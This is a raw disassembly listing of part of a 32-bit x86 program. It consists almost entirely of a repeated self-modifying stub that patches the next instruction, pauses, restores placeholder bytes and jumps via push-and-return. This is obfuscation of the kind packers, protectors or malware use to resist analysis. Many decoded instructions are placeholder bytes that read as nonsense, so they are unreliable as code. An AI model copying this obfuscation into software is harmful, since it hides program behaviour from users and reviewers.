  4073c0:	8d 40 00             	lea    0x0(%eax),%eax
  4073c3:	50                   	push   %eax
  4073c4:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4073c8:	66 87 05 bd 73 40 00 	xchg   %ax,0x4073bd
  4073cf:	b8 a6 95 66 85       	mov    $0x856695a6,%eax
  4073d4:	8d 40 01             	lea    0x1(%eax),%eax
  4073d7:	87 04 24             	xchg   %eax,(%esp)
  4073da:	c3                   	ret
  4073db:	8f 05 09 74 40 00    	pop    0x407409
  4073e1:	50                   	push   %eax
  4073e2:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4073e8:	8d 80 8e 80 17 40    	lea    0x4017808e(%eax),%eax
  4073ee:	87 05 f7 73 40 00    	xchg   %eax,0x4073f7
  4073f4:	58                   	pop    %eax
  4073f5:	f3 90                	pause
  4073f7:	e9 62 6e 92 00       	jmp    0xd2e25e
  4073fc:	50                   	push   %eax
  4073fd:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407401:	66 87 05 f7 73 40 00 	xchg   %ax,0x4073f7
  407408:	b8 e1 25 e2 bd       	mov    $0xbde225e1,%eax
  40740d:	87 04 24             	xchg   %eax,(%esp)
  407410:	c3                   	ret
  407411:	8f 05 44 74 40 00    	pop    0x407444
  407417:	50                   	push   %eax
  407418:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40741e:	8d 80 b2 e5 33 57    	lea    0x5733e5b2(%eax),%eax
  407424:	87 05 2d 74 40 00    	xchg   %eax,0x40742d
  40742a:	58                   	pop    %eax
  40742b:	f3 90                	pause
  40742d:	f1                   	int1
  40742e:	4a                   	dec    %edx
  40742f:	35 3d 40 00 00       	xor    $0x403d,%eax
  407434:	00 00                	add    %al,(%eax)
  407436:	00 50 66             	add    %dl,0x66(%eax)
  407439:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40743e:	05 2d 74 40 00       	add    $0x40742d,%eax
  407443:	b8 3e 25 21 c8       	mov    $0xc821253e,%eax
  407448:	8d 40 05             	lea    0x5(%eax),%eax
  40744b:	87 04 24             	xchg   %eax,(%esp)
  40744e:	c3                   	ret
  40744f:	8f 05 82 74 40 00    	pop    0x407482
  407455:	50                   	push   %eax
  407456:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40745c:	8d 80 b2 e5 63 57    	lea    0x5763e5b2(%eax),%eax
  407462:	87 05 6b 74 40 00    	xchg   %eax,0x40746b
  407468:	58                   	pop    %eax
  407469:	f3 90                	pause
  40746b:	4d                   	dec    %ebp
  40746c:	0f c9                	bswap  %ecx
  40746e:	91                   	xchg   %eax,%ecx
  40746f:	40                   	inc    %eax
  407470:	00 10                	add    %dl,(%eax)
  407472:	00 00                	add    %al,(%eax)
  407474:	00 50 66             	add    %dl,0x66(%eax)
  407477:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40747c:	05 6b 74 40 00       	add    $0x40746b,%eax
  407481:	b8 91 43 ea b3       	mov    $0xb3ea4391,%eax
  407486:	8d 40 05             	lea    0x5(%eax),%eax
  407489:	87 04 24             	xchg   %eax,(%esp)
  40748c:	c3                   	ret
  40748d:	8f 05 bb 74 40 00    	pop    0x4074bb
  407493:	50                   	push   %eax
  407494:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40749a:	8d 80 8c 84 17 40    	lea    0x4017848c(%eax),%eax
  4074a0:	87 05 a9 74 40 00    	xchg   %eax,0x4074a9
  4074a6:	58                   	pop    %eax
  4074a7:	f3 90                	pause
  4074a9:	35 3b 4e d5 00       	xor    $0xd54e3b,%eax
  4074ae:	50                   	push   %eax
  4074af:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4074b3:	66 87 05 a9 74 40 00 	xchg   %ax,0x4074a9
  4074ba:	b8 06 e5 b3 3d       	mov    $0x3db3e506,%eax
  4074bf:	87 04 24             	xchg   %eax,(%esp)
  4074c2:	c3                   	ret
  4074c3:	8f 05 f2 74 40 00    	pop    0x4074f2
  4074c9:	50                   	push   %eax
  4074ca:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4074d0:	8d 80 76 ed 5f 57    	lea    0x575fed76(%eax),%eax
  4074d6:	87 05 df 74 40 00    	xchg   %eax,0x4074df
  4074dc:	58                   	pop    %eax
  4074dd:	f3 90                	pause
  4074df:	dd 92 d5 1a 40 00    	fstl   0x401ad5(%edx)
  4074e5:	50                   	push   %eax
  4074e6:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4074ea:	66 87 05 df 74 40 00 	xchg   %ax,0x4074df
  4074f1:	b8 70 bf 5e 0a       	mov    $0xa5ebf70,%eax
  4074f6:	8d 40 01             	lea    0x1(%eax),%eax
  4074f9:	87 04 24             	xchg   %eax,(%esp)
  4074fc:	c3                   	ret
  4074fd:	8f 05 2c 75 40 00    	pop    0x40752c
  407503:	50                   	push   %eax
  407504:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40750a:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  407510:	87 05 19 75 40 00    	xchg   %eax,0x407519
  407516:	58                   	pop    %eax
  407517:	f3 90                	pause
  407519:	51                   	push   %ecx
  40751a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40751b:	f0 a5                	lock movsl %ds:(%esi),%es:(%edi)
  40751d:	40                   	inc    %eax
  40751e:	00 50 66             	add    %dl,0x66(%eax)
  407521:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407526:	05 19 75 40 00       	add    $0x407519,%eax
  40752b:	b8 05 0b 08 55       	mov    $0x55080b05,%eax
  407530:	8d 40 01             	lea    0x1(%eax),%eax
  407533:	87 04 24             	xchg   %eax,(%esp)
  407536:	c3                   	ret
  407537:	8f 05 65 75 40 00    	pop    0x407565
  40753d:	50                   	push   %eax
  40753e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407544:	8d 80 8e 54 10 40    	lea    0x4010548e(%eax),%eax
  40754a:	87 05 53 75 40 00    	xchg   %eax,0x407553
  407550:	58                   	pop    %eax
  407551:	f3 90                	pause
  407553:	4b                   	dec    %ebx
  407554:	47                   	inc    %edi
  407555:	5a                   	pop    %edx
  407556:	bf 00 50 66 b8       	mov    $0xb8665000,%edi
  40755b:	eb e8                	jmp    0x407545
  40755d:	66 87 05 53 75 40 00 	xchg   %ax,0x407553
  407564:	b8 c3 98 ff cc       	mov    $0xccff98c3,%eax
  407569:	87 04 24             	xchg   %eax,(%esp)
  40756c:	c3                   	ret
  40756d:	8f 05 9b 75 40 00    	pop    0x40759b
  407573:	50                   	push   %eax
  407574:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40757a:	8d 80 d3 27 79 ff    	lea    -0x86d82d(%eax),%eax
  407580:	87 05 89 75 40 00    	xchg   %eax,0x407589
  407586:	58                   	pop    %eax
  407587:	f3 90                	pause
  407589:	99                   	cltd
  40758a:	14 50                	adc    $0x50,%al
  40758c:	42                   	inc    %edx
  40758d:	ff 50 66             	call   *0x66(%eax)
  407590:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407595:	05 89 75 40 00       	add    $0x407589,%eax
  40759a:	b8 a6 da f4 3a       	mov    $0x3af4daa6,%eax
  40759f:	87 04 24             	xchg   %eax,(%esp)
  4075a2:	c3                   	ret
  4075a3:	8f 05 d1 75 40 00    	pop    0x4075d1
  4075a9:	50                   	push   %eax
  4075aa:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4075b0:	8d 80 d3 ae 83 ff    	lea    -0x7c512d(%eax),%eax
  4075b6:	87 05 bf 75 40 00    	xchg   %eax,0x4075bf
  4075bc:	58                   	pop    %eax
  4075bd:	f3 90                	pause
  4075bf:	13 4c 86 97          	adc    -0x69(%esi,%eax,4),%ecx
  4075c3:	ff 50 66             	call   *0x66(%eax)
  4075c6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4075cb:	05 bf 75 40 00       	add    $0x4075bf,%eax
  4075d0:	b8 35 4c 15 01       	mov    $0x1154c35,%eax
  4075d5:	87 04 24             	xchg   %eax,(%esp)
  4075d8:	c3                   	ret
  4075d9:	8f 05 08 76 40 00    	pop    0x407608
  4075df:	50                   	push   %eax
  4075e0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4075e6:	8d 80 ea 05 78 52    	lea    0x527805ea(%eax),%eax
  4075ec:	87 05 f5 75 40 00    	xchg   %eax,0x4075f5
  4075f2:	58                   	pop    %eax
  4075f3:	f3 90                	pause
  4075f5:	6c                   	insb   (%dx),%es:(%edi)
  4075f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4075f7:	93                   	xchg   %eax,%ebx
  4075f8:	15 40 00 50 66       	adc    $0x66500040,%eax
  4075fd:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407602:	05 f5 75 40 00       	add    $0x4075f5,%eax
  407607:	b8 6f f1 2c a5       	mov    $0xa52cf16f,%eax
  40760c:	8d 40 01             	lea    0x1(%eax),%eax
  40760f:	87 04 24             	xchg   %eax,(%esp)
  407612:	c3                   	ret
  407613:	8f 05 42 76 40 00    	pop    0x407642
  407619:	50                   	push   %eax
  40761a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407620:	8d 80 ea f5 a7 52    	lea    0x52a7f5ea(%eax),%eax
  407626:	87 05 2f 76 40 00    	xchg   %eax,0x40762f
  40762c:	58                   	pop    %eax
  40762d:	f3 90                	pause
  40762f:	94                   	xchg   %eax,%esp
  407630:	95                   	xchg   %eax,%ebp
  407631:	33 2b                	xor    (%ebx),%ebp
  407633:	40                   	inc    %eax
  407634:	00 50 66             	add    %dl,0x66(%eax)
  407637:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  40763c:	05 2f 76 40 00       	add    $0x40762f,%eax
  407641:	b8 ad 43 03 ef       	mov    $0xef0343ad,%eax
  407646:	8d 40 01             	lea    0x1(%eax),%eax
  407649:	87 04 24             	xchg   %eax,(%esp)
  40764c:	c3                   	ret
  40764d:	8f 05 7b 76 40 00    	pop    0x40767b
  407653:	50                   	push   %eax
  407654:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40765a:	8d 80 d3 5c 73 ff    	lea    -0x8ca32d(%eax),%eax
  407660:	87 05 69 76 40 00    	xchg   %eax,0x407669
  407666:	58                   	pop    %eax
  407667:	f3 90                	pause
  407669:	ee                   	out    %al,(%dx)
  40766a:	2d a6 8e ff 50       	sub    $0x50ff8ea6,%eax
  40766f:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407673:	66 87 05 69 76 40 00 	xchg   %ax,0x407669
  40767a:	b8 d9 84 1b 84       	mov    $0x841b84d9,%eax
  40767f:	87 04 24             	xchg   %eax,(%esp)
  407682:	c3                   	ret
  407683:	8f 05 b1 76 40 00    	pop    0x4076b1
  407689:	50                   	push   %eax
  40768a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407690:	8d 80 d3 0f 7e ff    	lea    -0x81f02d(%eax),%eax
  407696:	87 05 9f 76 40 00    	xchg   %eax,0x40769f
  40769c:	58                   	pop    %eax
  40769d:	f3 90                	pause
  40769f:	e6 64                	out    %al,$0x64
  4076a1:	d6                   	salc
  4076a2:	ef                   	out    %eax,(%dx)
  4076a3:	ff 50 66             	call   *0x66(%eax)
  4076a6:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4076ab:	05 9f 76 40 00       	add    $0x40769f,%eax
  4076b0:	b8 7d 2c 99 10       	mov    $0x10992c7d,%eax
  4076b5:	87 04 24             	xchg   %eax,(%esp)
  4076b8:	c3                   	ret
  4076b9:	8f 05 e8 76 40 00    	pop    0x4076e8
  4076bf:	50                   	push   %eax
  4076c0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4076c6:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  4076cc:	87 05 d5 76 40 00    	xchg   %eax,0x4076d5
  4076d2:	58                   	pop    %eax
  4076d3:	f3 90                	pause
  4076d5:	67 6f                	outsl  %ds:(%si),(%dx)
  4076d7:	30 10                	xor    %dl,(%eax)
  4076d9:	40                   	inc    %eax
  4076da:	00 50 66             	add    %dl,0x66(%eax)
  4076dd:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4076e2:	05 d5 76 40 00       	add    $0x4076d5,%eax
  4076e7:	b8 c8 08 ec 04       	mov    $0x4ec08c8,%eax
  4076ec:	8d 40 01             	lea    0x1(%eax),%eax
  4076ef:	87 04 24             	xchg   %eax,(%esp)
  4076f2:	c3                   	ret
  4076f3:	8f 05 22 77 40 00    	pop    0x407722
  4076f9:	50                   	push   %eax
  4076fa:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407700:	8d 80 ea f5 03 52    	lea    0x5203f5ea(%eax),%eax
  407706:	87 05 0f 77 40 00    	xchg   %eax,0x40770f
  40770c:	58                   	pop    %eax
  40770d:	f3 90                	pause
  40770f:	e1 65                	loope  0x407776
  407711:	4b                   	dec    %ebx
  407712:	33 40 00             	xor    0x0(%eax),%eax
  407715:	50                   	push   %eax
  407716:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40771a:	66 87 05 0f 77 40 00 	xchg   %ax,0x40770f
  407721:	b8 bb 5e 91 95       	mov    $0x95915ebb,%eax
  407726:	8d 40 01             	lea    0x1(%eax),%eax
  407729:	87 04 24             	xchg   %eax,(%esp)
  40772c:	c3                   	ret
  40772d:	8f 05 5b 77 40 00    	pop    0x40775b
  407733:	50                   	push   %eax
  407734:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40773a:	8d 80 6e 5c e4 0b    	lea    0xbe45c6e(%eax),%eax
  407740:	87 05 49 77 40 00    	xchg   %eax,0x407749
  407746:	58                   	pop    %eax
  407747:	f3 90                	pause
  407749:	85 1e                	test   %ebx,(%esi)
  40774b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40774c:	40                   	inc    %eax
  40774d:	00 50 66             	add    %dl,0x66(%eax)
  407750:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407755:	05 49 77 40 00       	add    $0x407749,%eax
  40775a:	b8 1d 4c ff 51       	mov    $0x51ff4c1d,%eax
  40775f:	87 04 24             	xchg   %eax,(%esp)
  407762:	c3                   	ret
  407763:	8f 05 91 77 40 00    	pop    0x407791
  407769:	50                   	push   %eax
  40776a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407770:	8d 80 53 9d e9 3f    	lea    0x3fe99d53(%eax),%eax
  407776:	87 05 7f 77 40 00    	xchg   %eax,0x40777f
  40777c:	58                   	pop    %eax
  40777d:	f3 90                	pause
  40777f:	84 b7 ba 8d 00 50    	test   %dh,0x50008dba(%edi)
  407785:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407789:	66 87 05 7f 77 40 00 	xchg   %ax,0x40777f
  407790:	b8 34 c4 fd 44       	mov    $0x44fdc434,%eax
  407795:	87 04 24             	xchg   %eax,(%esp)
  407798:	c3                   	ret
  407799:	8f 05 c7 77 40 00    	pop    0x4077c7
  40779f:	50                   	push   %eax
  4077a0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4077a6:	8d 80 8e 64 17 40    	lea    0x4017648e(%eax),%eax
  4077ac:	87 05 b5 77 40 00    	xchg   %eax,0x4077b5
  4077b2:	58                   	pop    %eax
  4077b3:	f3 90                	pause
  4077b5:	05 63 ac 58 00       	add    $0x58ac63,%eax
  4077ba:	50                   	push   %eax
  4077bb:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4077bf:	66 87 05 b5 77 40 00 	xchg   %ax,0x4077b5
  4077c6:	b8 69 09 01 3f       	mov    $0x3f010969,%eax
  4077cb:	87 04 24             	xchg   %eax,(%esp)
  4077ce:	c3                   	ret
  4077cf:	8f 05 fd 77 40 00    	pop    0x4077fd
  4077d5:	50                   	push   %eax
  4077d6:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4077dc:	8d 80 d3 4c 7c ff    	lea    -0x83b32d(%eax),%eax
  4077e2:	87 05 eb 77 40 00    	xchg   %eax,0x4077eb
  4077e8:	58                   	pop    %eax
  4077e9:	f3 90                	pause
  4077eb:	49                   	dec    %ecx
  4077ec:	b7 c9                	mov    $0xc9,%bh
  4077ee:	34 ff                	xor    $0xff,%al
  4077f0:	50                   	push   %eax
  4077f1:	66 b8 eb e8          	mov    $0xe8eb,%ax
  4077f5:	66 87 05 eb 77 40 00 	xchg   %ax,0x4077eb
  4077fc:	b8 ad d6 52 a4       	mov    $0xa452d6ad,%eax
  407801:	87 04 24             	xchg   %eax,(%esp)
  407804:	c3                   	ret
  407805:	8f 05 34 78 40 00    	pop    0x407834
  40780b:	50                   	push   %eax
  40780c:	90                   	nop
  40780d:	b8 15 20 40 00       	mov    $0x402015,%eax
  407812:	8d 80 76 1d 04 52    	lea    0x52041d76(%eax),%eax
  407818:	87 05 21 78 40 00    	xchg   %eax,0x407821
  40781e:	58                   	pop    %eax
  40781f:	f3 90                	pause
  407821:	4d                   	dec    %ebp
  407822:	a1 5c f7 40 00       	mov    0x40f75c,%eax
  407827:	50                   	push   %eax
  407828:	66 b8 eb e8          	mov    $0xe8eb,%ax
  40782c:	66 87 05 21 78 40 00 	xchg   %ax,0x407821
  407833:	b8 ab e8 24 86       	mov    $0x8624e8ab,%eax
  407838:	8d 40 01             	lea    0x1(%eax),%eax
  40783b:	87 04 24             	xchg   %eax,(%esp)
  40783e:	c3                   	ret
  40783f:	8f 05 6e 78 40 00    	pop    0x40786e
  407845:	50                   	push   %eax
  407846:	90                   	nop
  407847:	b8 15 20 40 00       	mov    $0x402015,%eax
  40784c:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  407852:	87 05 5b 78 40 00    	xchg   %eax,0x40785b
  407858:	58                   	pop    %eax
  407859:	f3 90                	pause
  40785b:	75 21                	jne    0x40787e
  40785d:	5f                   	pop    %edi
  40785e:	13 40 00             	adc    0x0(%eax),%eax
  407861:	50                   	push   %eax
  407862:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407866:	66 87 05 5b 78 40 00 	xchg   %ax,0x40785b
  40786d:	b8 28 ce cd 2a       	mov    $0x2acdce28,%eax
  407872:	8d 40 01             	lea    0x1(%eax),%eax
  407875:	87 04 24             	xchg   %eax,(%esp)
  407878:	c3                   	ret
  407879:	8f 05 a8 78 40 00    	pop    0x4078a8
  40787f:	50                   	push   %eax
  407880:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407886:	8d 80 ea 15 78 56    	lea    0x567815ea(%eax),%eax
  40788c:	87 05 95 78 40 00    	xchg   %eax,0x407895
  407892:	58                   	pop    %eax
  407893:	f3 90                	pause
  407895:	77 da                	ja     0x407871
  407897:	b1 99                	mov    $0x99,%cl
  407899:	40                   	inc    %eax
  40789a:	00 50 66             	add    %dl,0x66(%eax)
  40789d:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4078a2:	05 95 78 40 00       	add    $0x407895,%eax
  4078a7:	b8 17 bc 83 76       	mov    $0x7683bc17,%eax
  4078ac:	8d 40 01             	lea    0x1(%eax),%eax
  4078af:	87 04 24             	xchg   %eax,(%esp)
  4078b2:	c3                   	ret
  4078b3:	8f 05 e1 78 40 00    	pop    0x4078e1
  4078b9:	50                   	push   %eax
  4078ba:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4078c0:	8d 80 53 68 17 40    	lea    0x40176853(%eax),%eax
  4078c6:	87 05 cf 78 40 00    	xchg   %eax,0x4078cf
  4078cc:	58                   	pop    %eax
  4078cd:	f3 90                	pause
  4078cf:	20 23                	and    %ah,(%ebx)
  4078d1:	f6 97 00 50 66 b8    	notb   -0x4799b000(%edi)
  4078d7:	eb e8                	jmp    0x4078c1
  4078d9:	66 87 05 cf 78 40 00 	xchg   %ax,0x4078cf
  4078e0:	b8 f0 03 29 49       	mov    $0x492903f0,%eax
  4078e5:	87 04 24             	xchg   %eax,(%esp)
  4078e8:	c3                   	ret
  4078e9:	8f 05 17 79 40 00    	pop    0x407917
  4078ef:	50                   	push   %eax
  4078f0:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4078f6:	8d 80 8e 60 17 40    	lea    0x4017608e(%eax),%eax
  4078fc:	87 05 05 79 40 00    	xchg   %eax,0x407905
  407902:	58                   	pop    %eax
  407903:	f3 90                	pause
  407905:	7c 08                	jl     0x40790f
  407907:	e0 91                	loopne 0x40789a
  407909:	00 50 66             	add    %dl,0x66(%eax)
  40790c:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407911:	05 05 79 40 00       	add    $0x407905,%eax
  407916:	b8 59 55 08 ac       	mov    $0xac085559,%eax
  40791b:	87 04 24             	xchg   %eax,(%esp)
  40791e:	c3                   	ret
  40791f:	8f 05 4e 79 40 00    	pop    0x40794e
  407925:	50                   	push   %eax
  407926:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40792c:	8d 80 ea f5 23 52    	lea    0x5223f5ea(%eax),%eax
  407932:	87 05 3b 79 40 00    	xchg   %eax,0x40793b
  407938:	58                   	pop    %eax
  407939:	f3 90                	pause
  40793b:	4d                   	dec    %ebp
  40793c:	c1 af b2 40 00 50 66 	shrl   $0x66,0x500040b2(%edi)
  407943:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  407948:	05 3b 79 40 00       	add    $0x40793b,%eax
  40794d:	b8 bd aa 01 53       	mov    $0x5301aabd,%eax
  407952:	8d 40 01             	lea    0x1(%eax),%eax
  407955:	87 04 24             	xchg   %eax,(%esp)
  407958:	c3                   	ret
  407959:	8f 05 87 79 40 00    	pop    0x407987
  40795f:	50                   	push   %eax
  407960:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407966:	8d 80 d3 b6 69 ff    	lea    -0x96492d(%eax),%eax
  40796c:	87 05 75 79 40 00    	xchg   %eax,0x407975
  407972:	58                   	pop    %eax
  407973:	f3 90                	pause
  407975:	f6 ef                	imul   %bh
  407977:	d3 af ff 50 66 b8    	shrl   %cl,-0x4799af01(%edi)
  40797d:	eb e8                	jmp    0x407967
  40797f:	66 87 05 75 79 40 00 	xchg   %ax,0x407975
  407986:	b8 38 f7 19 86       	mov    $0x8619f738,%eax
  40798b:	87 04 24             	xchg   %eax,(%esp)
  40798e:	c3                   	ret
  40798f:	8f 05 bd 79 40 00    	pop    0x4079bd
  407995:	50                   	push   %eax
  407996:	8b 05 06 71 40 00    	mov    0x407106,%eax
  40799c:	8d 80 53 c0 e2 3f    	lea    0x3fe2c053(%eax),%eax
  4079a2:	87 05 ab 79 40 00    	xchg   %eax,0x4079ab
  4079a8:	58                   	pop    %eax
  4079a9:	f3 90                	pause
  4079ab:	2e 79 e3             	jns,pn 0x407991
  4079ae:	bb 00 50 66 b8       	mov    $0xb8665000,%ebx
  4079b3:	eb e8                	jmp    0x40799d
  4079b5:	66 87 05 ab 79 40 00 	xchg   %ax,0x4079ab
  4079bc:	b8 bc 01 71 58       	mov    $0x587101bc,%eax
  4079c1:	87 04 24             	xchg   %eax,(%esp)
  4079c4:	c3                   	ret
  4079c5:	8f 05 f3 79 40 00    	pop    0x4079f3
  4079cb:	50                   	push   %eax
  4079cc:	8b 05 06 71 40 00    	mov    0x407106,%eax
  4079d2:	8d 80 d3 56 7a ff    	lea    -0x85a92d(%eax),%eax
  4079d8:	87 05 e1 79 40 00    	xchg   %eax,0x4079e1
  4079de:	58                   	pop    %eax
  4079df:	f3 90                	pause
  4079e1:	b2 d4                	mov    $0xd4,%dl
  4079e3:	a0 95 ff 50 66       	mov    0x6650ff95,%al
  4079e8:	b8 eb e8 66 87       	mov    $0x8766e8eb,%eax
  4079ed:	05 e1 79 40 00       	add    $0x4079e1,%eax
  4079f2:	b8 1f 9e ce 21       	mov    $0x21ce9e1f,%eax
  4079f7:	87 04 24             	xchg   %eax,(%esp)
  4079fa:	c3                   	ret
  4079fb:	8f 05 29 7a 40 00    	pop    0x407a29
  407a01:	50                   	push   %eax
  407a02:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407a08:	8d 80 8e 5c 17 40    	lea    0x40175c8e(%eax),%eax
  407a0e:	87 05 17 7a 40 00    	xchg   %eax,0x407a17
  407a14:	58                   	pop    %eax
  407a15:	f3 90                	pause
  407a17:	17                   	pop    %ss
  407a18:	8c 84 84 00 50 66 b8 	mov    %es,-0x4799b000(%esp,%eax,4)
  407a1f:	eb e8                	jmp    0x407a09
  407a21:	66 87 05 17 7a 40 00 	xchg   %ax,0x407a17
  407a28:	b8 e5 4b 89 6d       	mov    $0x6d894be5,%eax
  407a2d:	87 04 24             	xchg   %eax,(%esp)
  407a30:	c3                   	ret
  407a31:	8f 05 5f 7a 40 00    	pop    0x407a5f
  407a37:	50                   	push   %eax
  407a38:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407a3e:	8d 80 d3 3e 67 ff    	lea    -0x98c12d(%eax),%eax
  407a44:	87 05 4d 7a 40 00    	xchg   %eax,0x407a4d
  407a4a:	58                   	pop    %eax
  407a4b:	f3 90                	pause
  407a4d:	6a fa                	push   $0xfffffffa
  407a4f:	81 32 ff 50 66 b8    	xorl   $0xb86650ff,(%edx)
  407a55:	eb e8                	jmp    0x407a3f
  407a57:	66 87 05 4d 7a 40 00 	xchg   %ax,0x407a4d
  407a5e:	b8 f5 bf bb a9       	mov    $0xa9bbbff5,%eax
  407a63:	87 04 24             	xchg   %eax,(%esp)
  407a66:	c3                   	ret
  407a67:	8f 05 95 7a 40 00    	pop    0x407a95
  407a6d:	50                   	push   %eax
  407a6e:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407a74:	8d 80 53 e0 cf ff    	lea    -0x301fad(%eax),%eax
  407a7a:	87 05 83 7a 40 00    	xchg   %eax,0x407a83
  407a80:	58                   	pop    %eax
  407a81:	f3 90                	pause
  407a83:	eb 4c                	jmp    0x407ad1
  407a85:	ff 8f 00 50 66 b8    	decl   -0x4799b000(%edi)
  407a8b:	eb e8                	jmp    0x407a75
  407a8d:	66 87 05 83 7a 40 00 	xchg   %ax,0x407a83
  407a94:	b8 ca 1f f5 25       	mov    $0x25f51fca,%eax
  407a99:	87 04 24             	xchg   %eax,(%esp)
  407a9c:	c3                   	ret
  407a9d:	8f 05 cc 7a 40 00    	pop    0x407acc
  407aa3:	50                   	push   %eax
  407aa4:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407aaa:	8d 80 ea f5 ef 51    	lea    0x51eff5ea(%eax),%eax
  407ab0:	87 05 b9 7a 40 00    	xchg   %eax,0x407ab9
  407ab6:	58                   	pop    %eax
  407ab7:	f3 90                	pause
  407ab9:	19 8e 53 c8 40 00    	sbb    %ecx,0x40c853(%esi)
  407abf:	50                   	push   %eax
  407ac0:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407ac4:	66 87 05 b9 7a 40 00 	xchg   %ax,0x407ab9
  407acb:	b8 56 4e 6d 29       	mov    $0x296d4e56,%eax
  407ad0:	8d 40 01             	lea    0x1(%eax),%eax
  407ad3:	87 04 24             	xchg   %eax,(%esp)
  407ad6:	c3                   	ret
  407ad7:	8f 05 05 7b 40 00    	pop    0x407b05
  407add:	50                   	push   %eax
  407ade:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407ae4:	8d 80 8e 58 17 40    	lea    0x4017588e(%eax),%eax
  407aea:	87 05 f3 7a 40 00    	xchg   %eax,0x407af3
  407af0:	58                   	pop    %eax
  407af1:	f3 90                	pause
  407af3:	72 c3                	jb     0x407ab8
  407af5:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  407af6:	f7 00 50 66 b8 eb    	testl  $0xebb86650,(%eax)
  407afc:	e8 66 87 05 f3       	call   0xf3460267
  407b01:	7a 40                	jp     0x407b43
  407b03:	00 b8 9e 47 bb 83    	add    %bh,-0x7c44b862(%eax)
  407b09:	87 04 24             	xchg   %eax,(%esp)
  407b0c:	c3                   	ret
  407b0d:	8f 05 3b 7b 40 00    	pop    0x407b3b
  407b13:	50                   	push   %eax
  407b14:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407b1a:	8d 80 a5 22 10 40    	lea    0x401022a5(%eax),%eax
  407b20:	87 05 29 7b 40 00    	xchg   %eax,0x407b29
  407b26:	58                   	pop    %eax
  407b27:	f3 90                	pause
  407b29:	f9                   	stc
  407b2a:	cf                   	iret
  407b2b:	1e                   	push   %ds
  407b2c:	2d 00 50 66 b8       	sub    $0xb8665000,%eax
  407b31:	eb e8                	jmp    0x407b1b
  407b33:	66 87 05 29 7b 40 00 	xchg   %ax,0x407b29
  407b3a:	b8 cd cb 86 a7       	mov    $0xa786cbcd,%eax
  407b3f:	87 04 24             	xchg   %eax,(%esp)
  407b42:	c3                   	ret
  407b43:	8f 05 72 7b 40 00    	pop    0x407b72
  407b49:	50                   	push   %eax
  407b4a:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407b50:	8d 80 78 ed 83 56    	lea    0x5683ed78(%eax),%eax
  407b56:	87 05 5f 7b 40 00    	xchg   %eax,0x407b5f
  407b5c:	58                   	pop    %eax
  407b5d:	f3 90                	pause
  407b5f:	86 cc                	xchg   %cl,%ah
  407b61:	b9 27 40 00 50       	mov    $0x50004027,%ecx
  407b66:	66 b8 eb e8          	mov    $0xe8eb,%ax
  407b6a:	66 87 05 5f 7b 40 00 	xchg   %ax,0x407b5f
  407b71:	b8 bb d2 77 3b       	mov    $0x3b77d2bb,%eax
  407b76:	8d 40 01             	lea    0x1(%eax),%eax
  407b79:	87 04 24             	xchg   %eax,(%esp)
  407b7c:	c3                   	ret
  407b7d:	8f 05 ab 7b 40 00    	pop    0x407bab
  407b83:	50                   	push   %eax
  407b84:	8b 05 06 71 40 00    	mov    0x407106,%eax
  407b8a:	8d 80 d3 4a 64 ff    	lea    -0x9bb52d(%eax),%eax
  407b90:	87 05 99 7b 40 00    	xchg   %eax,0x407b99
  407b96:	58                   	pop    %eax
  407b97:	f3 90                	pause
